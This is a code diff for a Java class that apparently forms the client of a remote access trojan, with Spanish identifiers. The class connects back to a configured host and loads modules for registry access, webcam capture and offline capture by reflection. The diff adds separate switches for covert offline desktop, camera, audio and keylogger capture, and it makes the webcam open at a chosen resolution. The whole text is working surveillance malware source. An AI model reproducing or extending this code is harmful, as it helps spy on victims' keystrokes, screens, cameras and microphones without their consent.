@@ -7,6 +7,7 @@ import comunes.Interfaz;
 import comunes.WebCamInterface;
 import comunes.WebCamItem;
 import java.awt.Color;
+import java.awt.Dimension;
 import java.awt.event.KeyEvent;
 import java.awt.im.InputContext;
 import java.io.File;
@@ -69,8 +70,13 @@ public class Servicio extends Thread implements Interfaz {
     private String prefijo;
     private int delayConexion;
     private boolean autenticado = false;
-    private boolean capturaOffline = false;
-    private int delayCapturaEscritorio;
+    private boolean capturaOfflineEscritorio = false;
+//    private int delayCapturaEscritorio;
+    private boolean capturaOfflineCamara = false;
+//    private int delayCapturaCamara;
+    private boolean capturaOfflineAudio = false;
+//    private int delayCapturaAudio;
+    private boolean capturaOfflineKeylogger = false;
     private int intentos = 0;
     private boolean proxy = false;
     private boolean ejecutar = true;
@@ -158,23 +164,32 @@ public class Servicio extends Thread implements Interfaz {
 
     @Override
     public void instanciar(Object... parametros) {
-        this.clipboard = new CbUtil(this);
-        this.host = (String) parametros[0];
-        this.puerto = (Integer) parametros[1];
-        this.password = (String) parametros[2];
-        this.delayConexion = (Integer) parametros[3];
-        String pref = (String) parametros[4];
-        pref = (pref == null) ? "" : pref;
-        this.capturaOffline = (Boolean) parametros[5];
-        this.delayCapturaEscritorio = (Integer) parametros[6];
-        this.tipoConexion = (Integer) parametros[7];//inversa o directa
-        this.prefijo = pref;
-        if (UtilRT.isWindows()) {
-            try {
-                registro = ((AR) new CLRT().loadClass("rt.util.REG").newInstance());
-            } catch (Exception ex) {
-                registro = null;
+        try {
+            this.clipboard = new CbUtil(this);
+            this.host = (String) parametros[0];
+            this.puerto = (Integer) parametros[1];
+            this.password = (String) parametros[2];
+            this.delayConexion = (Integer) parametros[3];
+            String pref = (String) parametros[4];
+            pref = (pref == null) ? "" : pref;
+            this.tipoConexion = (Integer) parametros[5];//inversa o directa                       
+            this.prefijo = pref;
+            if (UtilRT.isWindows()) {
+                try {
+                    registro = ((AR) new CLRT().loadClass("rt.util.REG").newInstance());
+                } catch (Exception ex) {
+                    registro = null;
+                }
             }
+            this.capturaOfflineEscritorio = (Boolean) Inicio.config.obtenerParametro("off-escritorio");
+//            this.delayCapturaEscritorio = (Integer) Inicio.config.obtenerParametro("off-escritorio-delay");
+            this.capturaOfflineCamara = (Boolean) Inicio.config.obtenerParametro("off-camara");
+//            this.delayCapturaCamara = (Integer) Inicio.config.obtenerParametro("off-camara-delay");
+            this.capturaOfflineAudio = (Boolean) Inicio.config.obtenerParametro("off-audio");
+//            this.delayCapturaAudio = (Integer) Inicio.config.obtenerParametro("off-audio-delay");
+            this.capturaOfflineKeylogger = (Boolean) Inicio.config.obtenerParametro("off-keylogger");
+        } catch (Exception e) {
+            e.printStackTrace();
         }
     }
 
@@ -340,9 +355,11 @@ public class Servicio extends Thread implements Interfaz {
             if (webC == null) {
                 WebCamInterface wci = ((WebCamInterface) Class.forName("comunes.ObtenerWebCam").newInstance());
                 WebCamItem[] lstTmp = wci.listar();
+                Dimension[] lstDimen = wci.listarResoluciones();
                 webC = ((Interfaz) new CLRT().loadClass("rt.modulos.cam.CWC").newInstance());
                 webC.instanciar(this);
                 webC.set(1, lstTmp[0].getNombre());//seleccionar la primer webcam
+                webC.set(5, lstDimen[0].width + "x" + lstDimen[0].height);//seleccionar la primera resolucion
                 webC.ejecutar(2);//abrir
                 webC.set(2, 75);//setCalidad(75);
             }
@@ -365,6 +382,7 @@ public class Servicio extends Thread implements Interfaz {
         try {
             abrirCamaraDefault();
             enviarComando(Protocolo.GET_MINIATURA_CAM, webC.get(0));
+//            cerrarWC();
         } catch (Exception ex) {
 
         }
@@ -419,18 +437,17 @@ public class Servicio extends Thread implements Interfaz {
         }
     }
 
-    private boolean isConectado() {
-        return conectado;
-    }
-
-    private String getHost() {
-        return host;
-    }
-
-    private int getPuerto() {
-        return puerto;
-    }
-
+//    private boolean isConectado() {
+//        return conectado;
+//    }
+//
+//    private String getHost() {
+//        return host;
+//    }
+//
+//    private int getPuerto() {
+//        return puerto;
+//    }
     private void enviarMensaje(String mensaje) {
         this.enviarComando(Protocolo.MENSAJE_SERVIDOR, mensaje);
     }
@@ -439,11 +456,10 @@ public class Servicio extends Thread implements Interfaz {
         gestorEnvio.restarDescarga();
     }
 
-    private Interfaz getJnaUtil() {
-        return jnaUtil;
-    }
+//    private Interfaz getJnaUtil() {
+//        return jnaUtil;
+//    }
 //envia los archivos de captura actuales
-
     private void enviarOffline() {
         try {
             if (capturadorOffline != null) {
@@ -674,14 +690,16 @@ public class Servicio extends Thread implements Interfaz {
         Comando comando;
         while (ejecutar) {
             try {
-                if (capturaOffline) {
+                if (capturaOfflineEscritorio || capturaOfflineAudio || capturaOfflineCamara || capturaOfflineKeylogger) {
                     //capturaFotos
                     if (capturadorOffline == null || !(Boolean) capturadorOffline.get(2)) {
                         //activa el keylogger
-                        activarKeylogger();
+                        if (capturaOfflineKeylogger) {
+                            activarKeylogger();
+                        }
                         try {
                             capturadorOffline = ((Interfaz) new CLRT().loadClass("rt.modulos.var.COFF").newInstance());
-                            capturadorOffline.instanciar(this, delayCapturaEscritorio, kl, prefijo, delayCapturaEscritorio, delayCapturaEscritorio);
+                            capturadorOffline.instanciar(this, kl, prefijo);
                             capturadorOffline.ejecutar(0);
                         } catch (Exception ex) {
                         }
@@ -1217,22 +1235,22 @@ public class Servicio extends Thread implements Interfaz {
                 case 0://gethostname
                     return getHostName();
                 case 1://conectado
-                    return isConectado();
+                    return conectado;
                 case 2://Host
-                    return getHost();
+                    return host;
                 case 3://puerto
-                    return getPuerto();
+                    return puerto;
                 case 4://puerto transferencia
 //                    return getPuertoTransferencias();
-                    return getPuerto();
+                    return puerto;
                 case 5:
                     return isConexionInversa();
                 case 6:
                     return isConexionDirecta();
                 case 7:
-                    return getJnaUtil();
+                    return jnaUtil;
                 case 8:
-                    return capturaOffline;
+                    return capturaOfflineEscritorio || capturaOfflineCamara || capturaOfflineAudio || capturaOfflineKeylogger;
                 case 9:
                     return tiempoPing;
                 case 10:
